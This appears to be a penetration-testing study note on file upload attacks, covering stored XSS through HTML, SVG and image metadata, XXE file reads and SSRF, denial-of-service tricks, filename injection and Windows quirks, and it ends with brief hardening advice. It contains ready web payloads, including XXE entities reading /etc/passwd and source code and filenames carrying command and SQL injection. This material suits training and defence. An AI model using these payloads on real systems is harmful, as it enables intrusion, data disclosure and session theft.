
# File Upload Attacks - Other Upload Attacks

## 🧪 Limited File Uploads
When file upload is restricted and you cannot upload executable files (PHP, ASPX, etc.), exploitation is still possible. Even if RCE is off the table, the file becomes a vector for other high-impact vulnerabilities.

---

## 🔥 Stored XSS via File Upload
Even if code execution is blocked, some file types allow embedded JavaScript that executes in the context of the victim's browser.

### 🧾 HTML Upload
Uploading a simple `.html` file:
```html
<script>alert(document.cookie)</script>
```
- **Impact:** Session hijacking, CSRF, or phishing via the trusted domain.

### 🖼️ Metadata Injection
Using `exiftool` to inject payloads into image metadata:
`exiftool -Comment='"><img src=1 onerror=alert(1)>' image.jpg`
- **Impact:** Stored XSS if the application renders metadata (like "Comments" or "Author") in the UI.

### 🧬 SVG Upload
SVG files are XML-based, meaning they can contain JavaScript.
```xml
<?xml version="1.0"?>
<svg xmlns="[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg)">
  <script>alert(document.domain)</script>
</svg>
```
- **Impact:** XSS executed when the image is viewed directly or rendered.

---

## 🧠 XXE (XML External Entity)
If the backend uses an insecure XML parser to process SVG or other XML-based files, you can read internal system files or reach internal services.

### 📂 Read System Files
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>
```

### 🔐 Read Source Code (PHP Wrapper)
`<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">`

### 🌐 SSRF via XXE
`<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">`

---

## 💣 Denial of Service (DoS)
Disrupting availability without needing code execution.
- **XXE DoS (Billion Laughs):** Recursive entity expansion to exhaust memory.
- **ZIP Bomb:** A tiny archive that expands into petabytes of data upon extraction.
- **Pixel Flood:** An image with header dimensions set to extreme values (e.g., 99999x99999) to crash the image processor.

---

## 💥 Filename Injection
The filename itself is user-controlled input. If the application uses it in system commands, SQL queries, or renders it, it's an attack vector.

- **Command Injection:** `file$(whoami).jpg` or `file.jpg;whoami`
- **XSS via Filename:** `<script>alert(1)</script>.jpg`
- **SQL Injection:** `file';SELECT SLEEP(5);--.jpg`

---

## 🪟 Windows-Specific Attacks
- **Reserved Characters:** Using `|`, `<`, `>`, `*` to reveal path information or trigger errors.
- **Reserved Names:** Filenames like `CON`, `NUL`, `COM1`, or `LPT1` can hang the system or bypass filters.
- **8.3 Filename Trick:** Using short names (e.g., `WEB~1.CON`) to potentially overwrite or access sensitive files.

---

## 🔬 File Processing Attacks (The Attack Chain)
Upload is often just the first step. The real vulnerability triggers when the server **processes** the file:
1. **Resize/Convert:** Exploiting libraries like **ImageMagick** (ImageTragick) or **FFmpeg**.
2. **Parsing:** Exploiting PDF parsers or Office document handlers.
3. **Decompression:** Path traversal during ZIP extraction (`../../var/www/html/shell.php`).

---

## 🛡️ Secure Implementation
- **Sanitize Filenames:** Never trust the original filename; rename files to random UUIDs.
- **Disable Parsing:** Use safe libraries and disable external entity loading in XML parsers.
- **Sandbox Processing:** Process files in isolated containers with limited resources.
- **Storage:** Use non-executable storage (e.g., AWS S3) and serve files with `Content-Disposition: attachment`.

---

## 💣 Final Insight
File upload is not just about RCE. It is a gateway. If you can upload a file, you have a foothold to attack the server, the users, or the internal network.
